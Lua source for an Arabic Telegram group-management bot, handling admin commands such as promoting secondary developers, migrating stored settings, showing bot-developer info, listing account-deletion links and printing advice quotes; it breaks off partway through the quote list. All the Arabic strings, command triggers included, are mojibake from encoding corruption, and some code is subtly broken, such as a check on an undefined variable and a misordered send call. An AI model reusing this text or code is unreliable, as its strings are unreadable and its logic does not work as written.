if text == 'ΩΩΩ Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ' and DevTshake(msg) then
local Users = database:smembers('tshake:'..bot_id.."userss")
local Groups = database:smembers('tshake:'..bot_id..'groups') 
for i = 1, #Groups do
database:sadd(bot_id..'Tshake:Chek:Groups',Groups[i])  
local list1 = database:smembers('tshake:'..bot_id..'creatorbasic:'..Groups[i])
for k,v in pairs(list1) do
database:sadd(bot_id.."Tshake:Basic:Constructor"..Groups[i], v)
end
local list2 = database:smembers('tshake:'..bot_id..'creator:'..Groups[i])
for k,v in pairs(list2) do
database:sadd(bot_id.."Tshake:Constructor"..Groups[i], v)
end
local list3 = database:smembers('tshake:'..bot_id..'owners:'..Groups[i])
for k,v in pairs(list3) do
database:sadd(bot_id.."Tshake:Manager"..Groups[i], v)
end
local list4 = database:smembers('tshake:'..bot_id..'mods:'..Groups[i])
for k,v in pairs(list4) do
database:sadd(bot_id.."Tshake:Mod:User"..Groups[i], v)
end
database:set(bot_id.."Tshake:Lock:tagservrbot"..Groups[i],true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..'Tshake:'..lock..Groups[i],"del")    
end
end
for i = 1, #Users do
database:sadd(bot_id..'Tshake:UsersBot',Users[i])  
end
send(msg.chat_id_, msg.id_,'π₯βΏΨͺΩ ΩΩΩ : '..#Groups..' ΩΨ±ΩΨ¨\nπ€βΏΨͺΩ ΩΩΩ : '..#Users..' ΩΨ΄ΨͺΨ±Ω \nπβΏΩΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ« Ψ§ΩΩΨ―ΩΩ Ψ§ΩΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ¬Ψ―ΩΨ―')
end
if text == 'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±' and DevTshake(msg) then
database:del(bot_id..'Tshake:Text_Dev')
send(msg.chat_id_, msg.id_,'ββΏ ΨͺΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±')
end
if text == 'ΩΨΆΨΉ ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±' and DevTshake(msg) then
database:set(bot_id..'Tshake:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'β«οΈβΏ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ§Ω')
return false
end
if text and database:get(bot_id..'Tshake:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
database:del(bot_id..'Tshake:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'π¨βΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ±')
return false
end
database:set(bot_id..'Tshake:Text_Dev',text)
database:del(bot_id..'Tshake:Set:Text_Dev'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'π‘βΏΨͺΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ±')
return false
end
if text == 'Ψ±ΩΨΉ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ' and DevTshake(msg) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == "Ψ§ΩΨ³Ψ§ΨΉΩ" then
local yytesj20 = "\n Ψ§ΩΨ³Ψ§ΨΉΩ Ψ§ΩΨ§Ω : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,yytesj20)
end

if text == "Ψ§ΩΨͺΨ§Ψ±ΩΨ?" then
local cfhoog =  "\n Ψ§ΩΨͺΨ§Ψ±ΩΨ? : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,cfhoog)
end

if text == "ΨͺΨ­Ψ―ΩΨ«" and DevTshake(msg) then
dofile("Tshake.lua")  
send(msg.chat_id_, msg.id_, "ββΏΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«")
end
if text == "Ψ§ΩΩΨ·ΩΨ±" or text == "ΩΨ·ΩΨ±" then
local TEXT_SUD = database:get(bot_id..'Tshake:Text_Dev')
if Text_Dev then 
send(msg.chat_id_, msg.id_,Text_Dev)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = 'γ ['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Name)..'&photo='..taha.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
 end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = SUDO, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
if text == 'Ψ§ΩΨ³ΩΨ±Ψ³' or text == 'Ψ³ΩΨ±Ψ³' or text == 'ΩΨ§Ψ³ΩΨ±Ψ³' or text == "ΩΨ§ Ψ³ΩΨ±Ψ³" then
local Text =[[
π»βΏα΄‘α΄Κα΄α΄α΄α΄ α΄α΄ sα΄α΄Κα΄α΄ α΄Κ?α΄
β’βββββββββββββββββββ’
π¨βΏα΄Κα΄ Κα΄sα΄ sα΄α΄Κα΄α΄ ΙͺΙ΄ α΄α΄ΚΚ
β’βββββββββββββββββββ’
πΊβΏsα΄α΄α΄α΄ , α΄α΄α΄α΄Κα΄α΄Κ , sα΄?α΄α΄Κ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ΩΩΨ§Ω Ψ§ΩΨ³ΩΨ±Ψ³',url="t.me/AKJA0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AKJA0&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == ("Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
function Function_BOYKA(extra, result, success)
database:sadd(bot_id.."DEV:Sudo:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","β ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_BOYKA, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$") and Owner(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$")
function Function_BOYKA(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"β ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."DEV:Sudo:T", result.id_)
Reply_Status(msg,result.id_,"reply","β ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
else
send(msg.chat_id_, msg.id_,"β ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_BOYKA, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$") and Owner(msg) then
local userid = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$")
database:sadd(bot_id.."DEV:Sudo:T", userid)
Reply_Status(msg,userid,"reply","β ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ")  
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
function Function_BOYKA(extra, result, success)
database:srem(bot_id.."DEV:Sudo:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","β ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_BOYKA, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$") and Owner(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$")
function Function_BOYKA(extra, result, success)
if result.id_ then
database:srem(bot_id.."DEV:Sudo:T", result.id_)
Reply_Status(msg,result.id_,"reply","β ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ")  
else
send(msg.chat_id_, msg.id_,"β ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_BOYKA, nil)
return false
end  
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$") and DevVAMBAIR(msg) then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$")
database:srem(bot_id.."DEV:Sudo:T", userid)
Reply_Status(msg,userid,"reply","β ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ")  
return false 
end
if text == ("Ψ§ΩΨ«Ψ§ΩΩΩΩΩ") and Owner(msg) then
local list = database:smembers(bot_id.."DEV:Sudo:T")
t = "\nβ ΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ ΩΩΨ¨ΩΨͺ \nβββββOwnerβββββ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."VAMBAIR:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- ("..v..")\n"
end
end
if #list == 0 then
t = "β ΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ Ψ«Ψ§ΩΩΩΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ") and Owner(msg) then
database:del(bot_id.."DEV:Sudo:T")
send(msg.chat_id_, msg.id_, "\nβ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ  ")
end
if text == 'ΨͺΩΨΉΩΩ ΩΩΩ ΨΆΨ§ΩΩΩ' and Owner(msg) then   
database:del(bot_id..'Tshake:Lock:Added:Me'..msg.chat_id_)  
send(msg.id_,'β ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± ΩΩΩ ΨΆΨ§ΩΩΩ') 
return false
end
if text == 'ΨͺΨΉΨ·ΩΩ ΩΩΩ ΨΆΨ§ΩΩΩ' and Owner(msg) then  
database:set(bot_id..'Tshake:Lock:Added:Me'..msg.chat_id_,true)  
send(msg.chat_id_, msg.id_,'β ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± ΩΩΩ ΨΆΨ§ΩΩΩ') 
return false
end

if text and text:match("(.*)(ΩΩΩ ΨΆΨ§ΩΩΩ)(.*)") then
if not database:get(bot_id..'Tshake:Lock:Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'β Ψ§ΩΨͺ ΩΩΨ΄Ψ¦ Ψ§ΩΩΨ¬ΩΩΨΉΩ ') 
return false
end
local Added_Me = database:get(bot_id.."Tshake:Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = 'β ΩΩ Ψ§ΩΨ?Ψ²ΩΨ± Ψ―Ψ§ Ψ§ΩΩΩ ΨΆΨ§ΩΩ β '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'β ΩΨͺ Ψ―Ψ?ΩΨͺ ΨΉΨ¨Ψ± Ψ§ΩΨ±Ψ§Ψ¨Ψ· Ψ§Ψ΅Ψ­Ψ§ ΩΨ―Ω ΩΨ§Ψ¨Ψ§') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'β Ψ§ΩΨ± Ω ΨΆΨ§ΩΩΩ ΨͺΩ ΨͺΨΉΨ·ΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ ') 
end
end
if text == 'Ψ¬Ψ§ΩΨ§' or text == 'ΨΉΩΨ±Ω' or text == 'Gava' then
local Text = [[
ΩΨ¨Ψ±ΩΨ¬ Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§.π§βπ»

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'α±.ππ¦π« πππ―π.α² ',url="t.me/UU_ak0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'Ψ§Ψ­ΩΨ―'  then
local Text = [[
ΩΨ·ΩΨ± Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§ β
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'α±.πππ― ππ‘π¦ππ.α² ',url="t.me/Dev_Ah8"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ΨͺΨ§ΩΨ¬Ψ±'  then
local Text = [[
 ΩΨ·ΩΨ± Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§ β
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'α±.πππ― πππ¦π².α² ',url="t.me/Dev_RE9"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'Ψ±Ψ§Ψ¨Ψ· Ψ­Ψ°Ω' or text == 'Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΨ­Ψ°Ω' or text == 'Ψ¨ΩΨͺ Ψ­Ψ°Ω' or text == 'Ψ¨ΩΨͺ Ψ§ΩΨ­Ψ°Ω' then 
local Text = [[ 
Ψ±Ψ§Ψ¨Ψ· Ψ­Ψ°Ω Ψ¬ΩΩΨΉ ΩΩΩΨΉ Ψ§ΩΨͺΩΨ§Ψ΅Ω
ΩΨ­Ω ΩΨ³ΨΉΩ ΩΩΨΉΩ Ψ§ΩΨ?ΩΨ± ππ
]] 
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = 'Telegram',url="https://my.telegram.org/auth?to=delete"}, 
{text = 'BOT Telegram', url="t.me/LC6BOT"}}, 
{{text = 'instagram', url="https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/"}}, 
{{text = 'Facebook', url="https://www.facebook.com/help/deleteaccount"}}, 
{{text = 'Snspchat', url="https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text and text:match('^Ψ§ΩΨ­Ψ³Ψ§Ψ¨ (%d+)$') then
local id = text:match('^Ψ§ΩΨ­Ψ³Ψ§Ψ¨ (%d+)$')
local text = 'Ψ§ΨΆΨΊΨ· ΩΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΨ­Ψ³Ψ§Ψ¨'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text == "Ψ§ΩΨ΅Ψ­ΩΩ" or text == "Ψ§ΩΨ΅Ψ­ΩΩ" or text == "Ψ§ΩΨ΅Ψ­" then 
local TWEET_Msg = { 
"ΨΉΨ§ΩΩ Ψ§ΩΩΨ§Ψ³ Ψ¨Ψ£Ψ?ΩΨ§ΩΩ ΩΩΨ§ Ψ¨Ψ£Ψ?ΩΨ§ΩΩΩ", 
"Ψ§ΩΨ¬ΩΨ§Ω ΩΩΩΨͺ Ψ§ΩΨ£ΩΨΈΨ§Ψ± ΩΩΩ Ψ§ΩΨ·ΩΨ¨Ω ΨͺΩΩΨͺ Ψ§ΩΩΩΩΨ¨ ", 
"Ψ§ΩΨ§ΨΉΨͺΨ°Ψ§Ψ± ΨΉΩ Ψ§ΩΨ£Ψ?Ψ·Ψ§Ψ‘ ΩΨ§ ΩΨ¬Ψ±Ψ­ ΩΨ±Ψ§ΩΨͺΩ Ψ¨Ω ΩΨ¬ΨΉΩΩ ΩΨ¨ΩΨ± ΩΩ ΩΨΈΨ± Ψ§ΩΩΨ§Ψ³ ",
"ΩΨ§ ΨͺΨ±Ψ¬Ω Ψ§ΩΨ³ΩΨ§Ψ­Ω ΩΩ Ψ¨Ψ?ΩΩ.. ΩΩΨ§ ΩΩ Ψ§ΩΨ¨Ψ§Ψ± ΩΨΈΩΨ§Ω ΩΨ§Ψ‘",
"ΩΨ§ ΨͺΨ­ΩΨ±ΩΩ Ψ΅ΨΊΩΨ±Ω Ψ₯Ω Ψ§ΩΨ¬Ψ¨Ψ§Ω ΩΩ Ψ§ΩΨ­Ψ΅Ω",
"ΩΨ§ ΨͺΨ³ΨͺΨ­Ω ΩΩ Ψ₯ΨΉΨ·Ψ§Ψ‘ ΩΨ₯Ω Ψ§ΩΨ­Ψ±ΩΨ§Ω Ψ£ΩΩ ΩΩΩ ", 
"ΩΨ§ ΨͺΨΈΩΩ Ψ­ΨͺΩ ΩΨ§ ΨͺΨͺΨΈΩΩ ",
"ΩΨ§ ΨͺΩΩ ΩΨ΅Ψ§Ψ― Ψ§ΩΨ±ΩΨ­ ΩΩΨ§ ΨͺΩΨ΄Ω ΩΨΉΩΨ§ ",
"ΩΨ§ ΨͺΩΨ³Ψ¨ ΩΩΨ―Ω Ψ§ΩΨͺΨ­ΩΩ Ψ§ΩΨ§ Ψ¨Ψ§ΩΨͺΨΉΩΩ",
"ΩΨ§ ΨͺΩΨ― ΨΉΩΩΩ ΩΩ ΩΨ― ΨΊΩΨ±Ω ",
"ΩΨ§ ΨͺΩΩΨ­ Ψ§ΩΨ§ ΩΩΩ ΩΨ³ΨͺΨ­ΩΨ§ΩΨ§ ΩΩΨ­Ψ§ΩΨΈ ΨΉΩΩΩΨ§",
"ΩΨ§ Ψ­ΩΨ§Ω ΩΩΨ₯ΩΨ³Ψ§Ω Ψ¨ΩΨ§ ΩΨ¨Ψ§Ψͺ",
"ΩΨ§ Ψ­ΩΨ§Ω ΩΩ Ψ§ΩΨ±Ψ²Ω.. ΩΩΨ§ Ψ΄ΩΨ§ΨΉΩ ΩΩ Ψ§ΩΩΩΨͺ",
"ΩΩΨ§ ΨͺΨ―ΩΩ ΨͺΨ―Ψ§Ω",
"ΩΨ§ Ψ―ΩΩ ΩΩΩ ΩΨ§ ΨΉΩΨ― ΩΩ ",
"ΩΨ§ Ψ³ΩΨ·Ψ§Ω ΨΉΩΩ Ψ§ΩΨ―ΩΩ ΩΩΩΨ§ ΩΨ­Ψ¨ Ψ£Ω Ψ¨ΩΨ±Ω",
"ΩΨ§ ΩΨ±ΩΩ ΩΩΩ ΩΨ§Ψ―ΩΩ ΩΩ ",
"ΩΨ§ ΩΨ―Ψ?Ω Ψ§ΩΨ¬ΩΩ ΩΩ ΩΨ§ΩΨ£ΩΩ ΩΩ Ψ¬Ψ§Ψ²Ω Ψ¨ΩΨ§Ψ¦ΩΩ",
"ΩΨ³Ψ±ΩΨ§ ΩΩΨ§ ΨͺΨΉΨ³Ψ±ΩΨ§... ΩΩΨ΄ΩΨ±Ψ§ ΩΩΨ§ ΨͺΩΩΨ±ΩΨ§",
"ΩΨ―ΩΩ Ψ§ΩΨ΅Ψ―Ψ± ΩΨ§ ΩΨ¨ΩΩ Ψ§ΩΨΉΩΩ Ψ§ΩΩΨ§Ψ³ΨΉ ",
"Ψ£Ψ«ΩΩ ΩΨ§ ΩΩΨΆΨΉ ΩΩ Ψ§ΩΩΩΨ²Ψ§Ω ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ© Ψ­Ψ³Ω Ψ§ΩΨ?ΩΩ ",
"Ψ£Ψ¬ΩΩ Ψ§ΩΩΨ§Ψ³ ΩΩ ΨͺΨ±Ω ΩΩΩΩ ΩΨ§ ΨΉΩΨ―Ω ΩΨΈΩ ΩΨ§ ΨΉΩΨ― Ψ§ΩΩΨ§Ψ³ ",
"Ψ£Ψ­ΩΨ§ΩΨ§Ω.. ΩΩΨ΅Ψ¨Ψ­ Ψ§ΩΩΩΩ Ψ­ΩΩΩΩ ",
"ΩΩΩΩΨΉΨ΄ ΨͺΨΉΨ§ΨͺΨ¨ Ψ­Ψ― ΩΨ¨ΩΨΉΩΩΨ΄ Ψ­Ψ³Ψ§Ψ¨ ΩΨ²ΨΉΩΩ ΨΉΨ΄Ψ§Ω ΩΨͺΨ²ΨΉΩΨ΄ ΩΨ±ΨͺΩΩ . ",
"Ψ§ΩΨ³ΩΨ± ΩΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΨ§ΩΩ ΩΨ?ΨͺΩΩΩ ΩΨ¬Ψ―ΩΨ―Ω ",
"ΨΉΨ―Ω ΨͺΨΆΩΨΉ Ψ§ΩΩΨ±Ψ΅ ΩΨ§Ψ³Ψ«ΩΨ§Ψ±ΩΨ§ ΩΨ­ΨΈΩ ΩΨ¬Ψ¨Ψ¦ΩΨ§ ",
" Ψ§ΨΉΨ·Ψ§Ψ‘ Ψ§ΩΨ§Ψ?Ψ±ΩΩ Ψ§ΩΨ«Ψ± ΩΩ ΩΨ§ ΩΨͺΩΩΨΉΩΩ",
"ΩΨΉΨ§ΩΩΩ Ψ§ΩΩΨ§Ψ³ Ψ¨ΩΨ·Ω ΩΩΩΩ ΨΉΨ―Ω Ψ§ΩΨ³ΩΨ§Ψ­ ΩΨ§Ψ­Ψ― Ψ¨Ψ³ΨͺΨΊΨ§ΩΨ§Ω Ψ°Ψ§ΩΩ ",
"ΨͺΩΩΩΩ Ψ΅Ψ―ΩΨ§Ψͺ Ψ¬Ψ―ΩΨ―Ω ΩΨΉ Ψ§ΩΨ­ΩΨΈ Ψ¨ΩΨ§Ψ΅Ψ―ΩΨ§Ψ‘ Ψ§ΩΩΩΨ―Ψ§ΩΩ ",
"ΨͺΨΉΩΩ Ψ§Ψ΅ΩΩ Ψ§ΩΩΩΩΩ Ψ¨Ψ―ΩΨ§ ΩΩ ΨͺΨΆΩΨΉ Ψ§ΩΩΩΨͺ Ω ΨͺΨΉΩΩ Ψ­ΩΩ Ψ§ΩΩΩΩΩ ",
"ΩΨ―Ψ­ ΨΉ Ψ§ΩΨ§ΩΩ Ψ«ΩΨ§Ψ« Ψ§Ψ΄Ψ?Ψ§Ψ΅ ΩΩΩΩΨ§ ",
"Ψ§ΩΩΨΈΨ± Ω ΨΉΩΩΩ Ψ§ΩΨ΄Ψ?Ψ§Ψ΅ ΨΉΩΨ― ΩΨ?Ψ§Ψ·Ψ¨ΨͺΩΩ ",
"Ψ§ΩΨͺΨ­ΩΩ Ψ¨ΩΨ³ΩΨ§Ψ­ ΩΨΉ Ψ§ΩΨ§Ψ?Ψ±ΩΩ Ψ§Ω Ψ§ΩΩΩΨ³ ",
"Ψ§ΩΨ§ΩΨ«Ψ§Ψ± ΩΩ ΩΩΩ ΩΩΩΩ Ψ΄ΩΨ±Ψ§ ",
" ΩΨ΅Ψ§ΩΨ­Ω Ψ§ΩΨ§Ψ?Ψ±ΩΩ Ψ¨Ψ«Ψ¨Ψ§Ψͺ ΩΩΩΨ© ",
"Ψ§ΩΨ§Ψ¨ΨͺΨΉΨ§Ψ― ΨΉΩ Ψ§ΩΩΩΨ§Ψ·Ω Ψ§ΩΨ³ΩΨ¦Ω Ψ§ΩΨ³ΩΨΉΩ ΩΨͺΨ¬ΩΨ¨ Ψ§ΩΨ§Ψ­Ψ―Ψ§Ψ« Ψ§ΩΨ³Ψ¦Ω ",
" Ψ§Ψ―Ψ?Ψ§Ψ± 10ΩͺΨΉ Ψ§ΩΨ§ΩΩ ΩΩ Ψ§ΩΨ―Ψ?Ω",
" ΨͺΨ¬ΩΨ¨ Ψ§ΩΩΨ?Ψ§ΩΩ ΩΩ Ψ?ΩΨ§Ω Ψ§ΩΨͺΨΉΩΩ ΩΩ ΨͺΨ¬Ψ§Ψ±Ψ¨ ΩΨ?ΨͺΩΩΩ",
" Ψ§ΩΨ­ΩΨ§ΨΈ ΨΉ Ψ§ΩΨ³ΩΨΉΩ ΩΨ§ΩΩΨ§ Ψ§ΨΊΩΩ ΩΨ§ ΩΩΩΩ Ψ§ΩΨ§ΩΨ³Ψ§Ω",
" ΨͺΨ­ΩΩΩ Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ‘ Ψ§ΩΩ Ψ§Ψ΅Ψ―ΩΨ§Ψ‘ ΩΩ Ψ?ΩΨ§Ω Ψ§ΩΩΩΨ§Ω Ψ¨ΨΉΩΩ Ψ¬ΩΨ―",
"ΩΨ§ ΨͺΨ΅Ψ―Ω ΩΩ ΩΨ§ ΨͺΨ³ΩΨΉΨΉ. ΩΩΨ§ ΨͺΩΩΩ ΩΩ ΩΨ§ ΨͺΩΨͺΩΩ . ΩΩΨ§ ΨͺΩΩ ΩΨ―Ψ± ΩΨ§ ΨͺΨ±ΨΊΨ¨ ",
